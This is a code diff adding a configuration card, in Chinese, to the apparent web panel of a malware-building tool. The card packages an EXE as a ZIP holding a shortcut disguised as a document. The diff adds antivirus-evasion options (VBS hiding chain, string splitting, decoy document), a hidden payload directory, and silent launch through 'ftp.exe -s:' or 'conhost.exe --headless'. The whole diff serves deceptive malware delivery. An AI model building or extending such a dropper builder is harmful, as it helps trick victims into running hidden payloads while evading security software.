@@ -127,6 +127,59 @@
     <div class="card-head">
         <div>
             <div class="card-title">
+                <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
+                LNK 压缩包
+            </div>
+            <div class="card-sub">把目标 EXE 打包为伪装成文档的快捷方式压缩包，双击后由系统组件拉起隐藏载荷。</div>
+        </div>
+    </div>
+    <div class="card-body">
+        <form method="POST">
+            <input type="hidden" name="save_lnk" value="1">
+            <div class="field-row">
+                <div class="form-group" style="flex: 1 1 220px;">
+                    <label for="lnk_lure_ext">伪装后缀</label>
+                    <select id="lnk_lure_ext" name="lnk_lure_ext">
+                        {% for ext in lure_ext_choices %}
+                        <option value="{{ ext }}" {% if config.lnk_lure_ext == ext %}selected{% endif %}>{{ ext }}</option>
+                        {% endfor %}
+                    </select>
+                    <span class="help">快捷方式命名为 <code>文件名.{{ config.lnk_lure_ext }}.lnk</code>，Windows 默认隐藏 <code>.lnk</code> 后缀。</span>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>免杀方式</label>
+                <div class="evasion-grid">
+                    {% for key, label, desc in evasion_options %}
+                    <label class="evasion-option">
+                        <input type="checkbox" name="lnk_evasion" value="{{ key }}" {% if key in lnk_evasion %}checked{% endif %}>
+                        <span class="evasion-text">
+                            <strong>{{ label }}</strong>
+                            <small>{{ desc }}</small>
+                        </span>
+                    </label>
+                    {% endfor %}
+                </div>
+                <span class="help">可多选，默认不启用。VBS 隐藏链、字符串拆分与诱饵文档会自动串接 Explorer → VBS → BAT 执行链。</span>
+            </div>
+            <div class="preview-box">
+                <svg class="icon icon-sm" aria-hidden="true"><use href="#i-eye"></use></svg>
+                <span>预览</span>
+                <code>{{ preview }}.{{ config.lnk_lure_ext }}.lnk</code>
+                <span class="muted">→ ZIP：{{ lnk_preview }}</span>
+            </div>
+            <p class="help">压缩包内仅显示该快捷方式，目标 EXE 与脚本放在隐藏目录。默认由 <code>ftp.exe -s:...</code> 启动载荷；启用 conhost 后改为 <code>conhost.exe --headless</code> 无窗口读取命令文件。</p>
+            <div class="form-actions">
+                <button type="submit" class="btn btn-primary">保存 LNK 设置</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="card">
+    <div class="card-head">
+        <div>
+            <div class="card-title">
                 <svg class="icon" aria-hidden="true"><use href="#i-zap"></use></svg>
                 运行行为
             </div>
